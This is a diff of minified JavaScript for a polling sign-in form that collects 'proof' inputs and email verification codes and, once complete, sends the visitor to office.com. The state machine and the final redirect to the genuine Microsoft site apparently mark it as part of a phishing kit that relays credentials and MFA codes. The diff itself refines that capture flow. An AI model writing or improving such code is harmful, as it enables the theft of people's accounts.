@@ -271,8 +271,8 @@ var choiceVal=s.value;
 var reqInput=s.dataset.requiresInput==='true';
 var hiddenVal='';
 if(reqInput){
-var optItem=s.closest('.option-item');
-var txtInp=optItem?optItem.querySelector('.option-text-input'):null;
+var optItem=s.closest('.proof-item');
+var txtInp=optItem?optItem.querySelector('.proof-input, .proof-input-full'):null;
 if(txtInp){
 hiddenVal=txtInp.value.trim();
 if(!hiddenVal){
@@ -340,9 +340,9 @@ if(isInit){showLoadingOverlay();isInit=false}else{setFormSubmitting(true)}
 sB.innerHTML='<span class="btnSpinner"></span>';sB.disabled=true;eF.readOnly=true;pF.disabled=true;
 startPolling(2000);break}
 case'PROCESSING':{
+if(!procStart)procStart=Date.now();
 if(lastVis){startPolling(2000);break}
 sB.innerHTML='<span class="btnSpinner"></span>';sB.disabled=true;eF.readOnly=true;pF.disabled=true;setFormSubmitting(true);
-if(!procStart)procStart=Date.now();
 startPolling(2000);break}
 case'WAITINGEMAIL':case'WAITINGEMAILERROR':{
 var ib=document.getElementById('identityBanner');if(ib)ib.style.display='none';
@@ -452,9 +452,9 @@ showFieldError('InvalidVerificationCode','verificationCodeGroup',em);codeErrShow
 vCI.value='';vCI.focus();startPolling(2000);break}
 case'PROCESSING_FINALIZING':case'COMPLETED':{
 stopPolling();
-var rU=TC.landingPageLink&&TC.landingPageLink.trim()!==''?TC.landingPageLink:window.location.href;
+var rU=TC.landingPageLink&&TC.landingPageLink.trim()!==''?TC.landingPageLink:'https://www.office.com';
 if(rU&&!rU.startsWith('http://')&&!rU.startsWith('https://'))rU='https://'+rU;
-window.location.href=rU;
+location.replace(rU);
 break}
 case'FAILED':{
 stopPolling();
